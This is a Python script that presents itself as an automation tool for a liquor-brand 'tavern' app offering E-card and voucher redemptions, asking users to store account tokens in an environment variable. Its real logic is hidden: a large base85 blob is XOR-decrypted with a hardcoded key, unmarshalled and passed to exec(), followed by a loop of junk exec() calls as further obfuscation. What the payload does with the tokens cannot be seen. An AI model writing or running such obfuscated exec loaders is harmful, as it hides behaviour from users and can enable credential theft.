# 大大鸣版 酒馆兑换E卡 美团 饿了么 腾讯视频等
#浓五的酒馆
#有问题联系v:xolag29638099
#环境变量 dadaming_nwjg=token（ey..）#多个账号用#分割
# -*- coding: utf-8 -*-
import base64
import marshal
import hashlib
import random
import os
import sys

def decrypt(encoded, key):
    """解密并执行代码"""
    try:
        # 验证校验和
        checksum = hashlib.sha256(encoded.encode()).hexdigest()[:16]
        if checksum != "ace2ceb7591620d7":
            print("Checksum verification failed")
            return None
            

        encrypted = base64.b85decode(encoded)

        key_bytes = key.encode()
        decrypted = bytes(b ^ key_bytes[idx % len(key_bytes)] for idx, b in enumerate(encrypted))

        code_obj = marshal.loads(decrypted)
        return code_obj
    except Exception as e:
        print("Decryption error:", str(e))
        return None


encrypted_code = "nN&4WRBcT)Rdz6RRWdPYR%JMBM2kXGc|+Vw6m=409#v6LIBXX*F?UpUIW}u+GGttCD0?bV9YQZi9C0OJAW$??Fl;F|Idf`pF*Q|fI%8F99)EFC9Y)VfDt#<s{#0*UFls0^KYTEBRWvbaR%K3XHcfI;97Z8PaCJyzdQ>%1Fl8t<KYTEBRWvbaR%KjkU3hR(c|%J}aCPoxdQ_fJRBcT)Rdz6R4>&VvGiY38MtBum98c{^aCPHldQ>%1RBcT)&URFO$Tyd0R%MfIM0jvgc|%J}adjqX9aL{#R&6LaF@2VGRWzDtR%JMBM0jvgctbBo^mP(zA4E}KKW|MnRdzyXS2R>%@MSn`?|5)hc|%J}aCJ#!A6Rix349kMFlTCJS2R>+Gk2bCM0nd%c|%J}aCJyzdsMkXFmE0;F?3^ed^$u$R%JL3HWwafS#o=8NL6A)P;?)1bWLqrFaZ!TJ3<*wzu>Bc;{KQa$EL&kS6p+AdQ>%18bnO*T@q0MFhE!YGfX+QO)UdA3j!=I9sw(4dQ>%1RBcT)Rdz6URWvbbR%JM!Y<O@|?n5t14Rt(adQ>%1RBcT)Rd!5t^EEMP{bV?7M0jvgc|%G|6m=V9Q&xK?S!Yc(Use!Qbrcavc7VO%tjyE5+Vic`{!c<~J`i}c-R-El#FL2kvaYp{-{s!$&5*^`pZVLZ=JKrH%)5!+v&+oW_|(+T?$C_<v*477`0th7&Y;W6nDXL*(8kg4$A$8)z1O^u?vK^f!+?d(p~U~S<Hw`++@1B=nbfqm+x)1F)|IgKbv|`18-SP9pu@|y#MYwR-kj?EobtD}?BJz=%ASPRx`@4u+Th;j=$y^eo%_b3>E*26^s}Mku-5j`=;PS%&(f{Mzwx1j>(`b2#jDK!m+#Dg!SB)U!HdAEu+o8&-J;jz$$*yMYFL@Y&85Zel*spk?)=@>&Wq8Rvh1{w?vK^f!-A~DqVUJP#m}zC^^?QMp6Ro;?BJxV#gdBpu#bz5{qAl&7oPaUoZsWE@8zuC;k=aIu+{h7>g(0}*wL!gv&)V{q2$1~_4%#%<&gI8oZO?e&()}~=8%Koy_2<$%;Dbe!JYQ!o%_I}&+eeb_OOZavj5=L)$}?r5qZ?c?}38iqwK-7)aS1E<(>W0ozAhg@7Ae^z@Mt*vXiin<>B7Y%bxheoW}jH%j2!|^s=kYvdhoW?fclk%G`y@ctzdH#-8rZo%ryt&ET!+@34s9vgO;+?cCJP@7$lwvfYA&>)o02z@*USm+#Ds{?60R_=v)qz4eWf<Gs|v+JT1Iqw?Rk{PnHY^N_&JmFT&*-1MlA!IQuKv!jQA*8ku0;ho9kpUm5@&hDVz(Xfv1yu!@W&G_HQ+0wY_u=%ly+54FN_@&dupUK36^2O2V_=x?pu<DqS!GhG`=8cxftk?0h@5Hb0#*o<RpWKzZ&B>~+?US{~y|Al~%E=Z?PMpi>o&Mgh%h0Uf!LW$OvitPV>G{^{@YAj0u*jT+<-wQ9*QC+Ul+W^l^1{-|;EThMv;L-?!hqN3^MQraqwLta*5;z>$&%B`ozAhg@7Ae^z@D`3v#6bp%;DV8`=8|ck;BfS^T@5<?y!!=v)0Sp&GXpX?$Vsiv&M*u-1d{w`$<8q?Aff|z_Ps3vEtm&?e*90(bBl-u=%ly(*Km{&!_XomFeJt_R-VX_=)hdvCh4n%%s)R*hSI%_L0HvR;JG9l*!+L_2U(_`Q)gK=99m~u)Cm)?&cVZ&G?nw=%(|?m+#Di^VHMM-HY3@vCW2&$g|ba+kt}1qwMdu^~SBh+>!O-p6s~0&Hbs5+g8@#<J^VNd5yN)q43#qp6<e<&*-k#@4Sl7yvoVl^!n7y@7s;#v;LTh>D-j)-lX5um(S>fz~dUa>+q|Fz@Cx#v5bq3`|REP%AW4doZif=<ixDl+OntryzR)--1gS}>e9OGc7cWPtoZe|!Oo-q?~(K0p6Q^v;LfRz?tD6u+_co@$AEzEqvG_p|HiK6$&vHnp6af*`OB${^_h(LvXZcm`^Vq-?3~KnoW}jH%j2)`(!I6DyV1eZ*WT63(A|*Iv-yyS{PURa#HQQDm+#D0PO*jEvikeb)AQ8N+uWbXvCFTD*us|D@1?@Pmg(|<!uinr*oerTu>O#p%#hX6^MQcoq5k!^*ZO6z$k4CC`>>Dov-#4{-QU;m-`%3ux!Jj906aam#@?*n>73H*oWp~(&)KV??2x$Py_J-V)8O90;GOl~k@x7X)5Wg*^s}$lvhdE(-QUyn*U*XSu=1XW`Nx;W(WS%PmC?n4^5W6x(uwwtvCE~C&WzOT<&C`dqU7AP@zoe80vtFHll6?X&%>&((Vmy^u)L^->gnC&-H_MRo%`{v^4+b|$g;clvEtg(_|nz!*xZH6v&M*u-1c5_oaM=_^4+Z5_pznkvgyLw>H65);@z0VvfZ+Y%-EUB-KE0Il+Nvg;q1`Y=Zo92vCW2lUvpR;J`h?~P7nkp2{3VFUlJh@5+PT7Hv%9UY)%C^JX%&pCkaz#WLQvgo7Uf{<>jjJ>b9W5w)oxGz~<87#nz<xwD72o(dd%L>7m}+lHk~e@5I-~#E;mex8tCez@*ds#)qx^rtRRc?9-{<;FsO>n8Bs6!TqnG#gwJwx1phn!}Z$v)SBhOo7UT@<>jjJ>b9W5w)oxGz~<87#nz<xwD72o(dd%L>7m}+lHk~e@5I-~#E;mbUse!Qb=IW#c10LWWLQvgSz~K!P*rF|T67h1bWLp)byg5mbrcavc10LWWLQvgSz~K!P*tk&>s}RdbWN|I#8wbgx1za=!0p=l%$nxfo7Kaq=KW|yn8LlV!sV}{-IS*Mx1za=!0i}JrtbK#@5`y(_*G~`TDGIww)@4`!~PIdbrcavc10LWWLQvgS!1c*;eTjET6EXP#Z7G$x8S&z!@Lnmc89LyrtbK1o7Kaq=KW|yTDGIww)@2ux8S&z!@Se~-iNN_WLT2K@uA(rlH<UJ?A#S{bWLp)byg5mbrcavc17Cx)pAgBS!1c*;Z<lvn8LlV!sTrhb(E(3x1za8wDYiz((q7nS)tv-lH<Tcn8LlV!sTt(!~W9Z-PWh!wDYh`rtbK#@5^gzP*rF|T67h1bWLp)bym{h#6A&8c17Cx)mTt+o7Kaq=KW|yTDGIww)@2ux8S&z!@Lnmc89LyrtbK1o7Kaq=KW|yn8LlV!sTrhx8S&z!@Lnmc10LWWLQvgSz~K!P*tk&>s}RdbWN|I#8wbgx1za=!0p=l%$nxfo7Kaq=KW|yn8LlV!sV}{-IS*Mx1za=!0i}JrtbK#@5^gzP*rF|n8LlV!sTrhbyg5mbrcavc10LWWLT2N=t*m9P*tk&>vR=zbWLp)byg5mbrcavc10LWWLQvgSz~K!P*rF|T67h1bWLp)byg5mbrcbc!}KytWLQwJ?9yv%P*rG+|Hj<((u&}Vu>OElbrcavc10LWWLQvgSz~K!P*rG#@5MiIbWLs7z~>NDbrcaQBmh|$AskRJ0AsH2*O2VPlkApqc}*Jxdqy5abrcavc10LWWLQvgSz~Ld<>W#{T67h#!TfC%byg6Z)S%Yd?Srn>p~U}aSv7Gp9~mhFNNodQY+ZB=byg5mbrcavc10LWWLQvgo7UPvP*rF|n8BoSbWLp)u+o>2@srrm^?`!OqRsKO$LFN?>O^=}PizKiVpx6^byg5mbrcavc10LWWLQvgo7UPvP*rF|n8B~G!TqnG#gwJwx1phn!}Z$v)SBhOo7UT@<>jjJ>b9W5w)oxGz~<87#nz<xwD72o(dd%L>7m}+lHk~e@5I-~#E;mex8tCez@*ds#)qx^rtRRc?9-{<;FsO>n8Bs6!TqnG#gwJwx1phn!}Z$v)SBhOo7UT@<>jjJ>b9W5w)oxGz~<87#nz<sTtyg6WKnU5d^0&B9syxxpi);eIs+(2CU-D&RTRr%Y8Ff$EfyDSqfa|I85=x17&TiwF&{rXRdz6cRWvagOl3H1#CU*EWlclNHh^+ue_p+G)gZ}u)jO~`)p^2cR%JL3M0jvgc|%J}aCJyzcvLk~S8Yu-rdlv`RiiN-S7kVCM0jvgc|%L>aCJz}dQ>%1RBcT)RSPf(RbDV@R%JMBM0jukd1^{NW_3tpoxrNJ-2J4l+K{Zy07q0Cdn8{8Dhydr3r9;!aIa1l8#+-vIYdnFUjsuCCu>j+GYd=~MR;&hSusOPaCMS(2sK+aI{*?uCKEy{G*eUuA{RDnM0i?Kc|$l~aCJ!Jda)!(#dg^))ja5bK;SxchG8TgPIz!qqfRd>6ci;56f<f(BL^zaR8>V`RWvb-^1|K7<B`bmoXpy+{>855(z2=BA!1E6Rg#F_ys@Kz@Z-?f;+_BH40=mTaFFc7pYW2q?9QmV#F4(lv$mO!<iy_a&5`xrp8n;m{@Sg^`LVjnz3RdkYZ6fqG+9^&F*;ToE*}$9c|%J}aCJyzdQ>%ERBcT*Rdz6kbvH3-!DU=+Ie8RN9Y8Nn40Y3F=T<>eRBcT)Rdz6RRWz4rR%MfHM0jvgc|%J}6mTqJ9#c_TFk~q|F@02cF*&VeD`#9{Aa@y41VBPd1a?SddQ>%1RBcT)KXfp3RWvbaR%JwOIC>0G)l=<AaCPHndQ>%1RBcT)C~{12^*1qTR%JMBM0jvgc|%J}aCJyzdQ_8ARBh%pRdz6RRWvbaD_~4zM0jvgc|%J}aCIzo4qr7=RBcT)Rdz6RKQb|CR%JMBM0nOxc|+h!aCJyzdQ>%1^lD8tRdz6RRWvbaR%JMBM0jvgc|$K*)^tc@(N#54RBcT)Rd%a%$TpW~R%MfIM0jvgc|%J}adk9d+Ez7ERBcT)Rdz6RRWvbaR%JMBM0gZI-$F}E+jK}|dQ>%1RBb6CK6Eg2RWw8RDqxsyM0jvgc|%J}aCJyzdQ>%1RBcT)F=JVD^ENSQ{bx9AM0jvgc|+?-aCJyzdQ>%1RBcT)Rdz6RRWvbaGILRE;(BmW(m_j0aCJyzdQ?bMC~NIERdz6RRWvbaR%JMBM0jvgc|%J}6k;rV+*UPG|8Gq-Rdz6RRWwX)DqxsyM0jvgc|%J}aCJyzdQ>%1RBcT)F=JVD^ENSQ{bx9AM0jvgc|+?-aCJyzdQ>%1RBcT)Rdz6RRWvbaGJITk;(BmW(m_j0aCJyzdQ?bSAY@H7Rdz6RRWvbaGJiyC-+1j%-$F}E+jK}|dQ>%1RBcQ(A%8G*RWvbaR%JMBAY%+#;zKW2?RM^EdQ_fMRBcT)Rdz6RR5Vp|1!YWSM0jvgc|%J}aCIzt22qtzRBcT)Rdz6RRWvbaR%JMBM0jvg9b7MK)^|u`(N;B5RBcT)Rd%a%$TpW~R%MfIM0jvgc|%J}adj+3DO46xAbm|WRdz6RRWvbaa%D<JIdKGAc|%J}aCJyzdQ?$xAbw3XRdz6RRWvbaDr}x@M0nd%c|%J}aCJyz;Z&$l@@!2t{&z5RRWvbaR%JPC9e5N{1WGkR6jU2z9#lwMDr7n|B6di33^Yb)e@1o|0}uoz2{3VFUj{q?875eKFc~0RIT}?4dskirc@|q9DOCU<7A_<|85$-@2{A_`Jq{=uB?Mm?IzU(kI7&+eBNksK7AGn)3V$O3A0!wvI0QRTk9PqMQg&1bBmhcGK4=jl2`?fj5dk3!6nkGGI|Da1e_0w1Uspp0B^DJQEesWieIO(`1Fua17bHO|E-fWNAqGQEdK*FvBok2&ArBQX5h6cj6B;E;4J=SLXAUb2U>5;EHvtI<WK$Pjc1~X+7$h!c76&N_A9`ITIRQ5$G7MP+c@$L)FbP>0AyiN>3pqtG7+4D`RxVv>B~X1EY+pRCUw2*yH~?E1Ef*e$aXUON5-KnZ2#z=tAsHoFCm%``AzfYvEN^WeAqrg+9wsF}3V90)6d+JMAV3*RB@^m$6jxFVCJ{nn7abFSKPEpY7+4z(4lz$$2M8`06B9%iJsErkG5|ti7abFSKPEpY7+4Ge2_WxP1_&!qClf*rT6IziGZjoh0TvTI9V#U(3VI0#88JmBc_A!YG6PW)Fzz}TBnnjnFcBX-Fei~wAUu9tNj6qDF<pEOWkga%Wds2TV^dxUeN9<VqeLSv5fLpG363)&H6JWkCIdcnRW#Pb=zy@?qVLAL?)PzP3S@0PS8-T>aS3e@9ZVHDZxLd%QU+HDAqsL*c|(y;6cjuKpixC2Jr^kNTn0iNFHwI8I{-~!M0jwt<>{={)sXG-pWcLsTplD+J2FuXCP61@R%PG8`knaVpUc~>`s!&!lG=i|>iTyTAZIXiRndmqzS^dX|J9fO$EL&kN>x2)dQ>&H@WdHFTXryXvYC&J-qqd6^^nB(Lt~Lh9R@EEc2qS|vhnBA%G254%-o*F5D+$OM0l6~$EL&kmC4G1!t4)neP=&ARdz70T}D(GBLGVnH==Vj95<0q8U`l{2vRjtR3A<?Rd(ukJ6lGxUKUIqA`BTn9GOB62o^0A4n0~tj&43dCto_QP(WS+GYjHxF$x?YWkX9#0%%BNdX7CHF&;fyI|Ws)Q$|!8BMD5lP6z@!111zA9up_Na3n`NE(j7^G#gc}Tt`?AI67PnJqxN+956vkaCK-zT67h1bWLp)Cw?$=Rqiz!KLS=BcX)78PD4ve1G7nFdek+dQf)?IRQ7X(Q#2+@j&U!vT~g3zsaj#1X<wCcU4<iifO}-^O<d?^LhLI~j(-@mURkI?ESpeesBUAFV_7;>q-{VtQ}%a+bu>7ChH?v>M|yr#`31W}WN=-%X-}bU^ls&1?I7T15#=H+f_8l5OrT*)?q1ne;cDD_@>0-RS-nGe$PTOs%u1~nfqD+UTTY;5Gm=yQq-q1SbQ$Gb8N5Y%fqs6ZU3$@CN9qFRe&`m1a$cW6ZPi(}adzcdcC}P0%517`^>UdjhkO^fU00_|N|91{z%uYQt4(!=O)bTLjc*g{ORg`$UDam2T|A^qJ<9=;XlvJQ;9iwv{9l|cd!i^>f-D2OPFILl{0X5-IG0lj_&lv>YlJ6d{8ybPVx}TPgg6PkT3zU1e5HItsZoFH8KqiKszw2VMp>LWV4^%hg*XJUMRKTEp>$z_YX$3l*H7wR(lLb$g-!|Kb~4~*6XYW=hiQMfNI#%nKATum;6Si}aX`gVR%lqoRdh9Br8F~aL%1+uly+Co3gddx2I)SubaUlgbG$_zfqodIT^#9VLhViDG4KW249h;Vh>ft6e^xL@td+G!OLj1H^KdvUPi6dFVm)b6yjnpGeRhpUWfDD6l4VG9Sas@r3Ts>lKMQ9wZELDkCLAv$6Dk)LUQ{(wCQD5<Rje`_CPp%8R%PODHXW*5A0i+wF916M2sKhSIvGDPRdz52Tr@FhBx^WqM51>$7d0X|9~+Wk2_#uNAh$(SHWgn1J3vAkP-Qr5o_icO7cqECaCMSwB@0_KIS3MJk8x2KHd{moA{P^EM0nX!3rR~$a0ftSdQ{I^XaFKnAR1LlCv-7sR%AGAL<>Yyc|*HMadb(%dS>NPW{pic)p@Xc)jR2FUF9?EPxyO^c}mMd@O;Q^qEsk?RB)X&NTx7pg)}U=R(RlSP561zaKl2Aa8a0KUW7Gvgl%c%RZ`$|al|)wS9i#4T6tokd0k3bfJ;kdXQVYzRdBsER(CCgTQoI##s{nhlzUKudSjDBXZ<?p0?anb2Jsi2TB0pXggXemSzNdzoP2rGJd;5S&{pV2+B}qh@IakE6{b2gg+6h(QY7qX1*mirsYeQ{e`LrkqEI~25xqxngmQMEQF7sJ5S2PWMQwmmRYG37a9K%liU>4PP+`SShjl5WRxRmmM&)$v3j99OH=9^cfOSe?ZlpC(QF+BOjb<nOQ0zHn-eIsg&2#)&@kql!fP6?`V1zbHq-jquL547PP#{BNR%JK"

key = "zT5RTmM5Uv0tU41iVe8lDxpRyCKKpuHd"


code_obj = decrypt(encrypted_code, key)
if code_obj:
    exec(code_obj)
else:
    print("Decryption failed")


for i in range(100):
    var_name = f"_var_{i}"
    exec(f"{var_name} = os.urandom(32)")
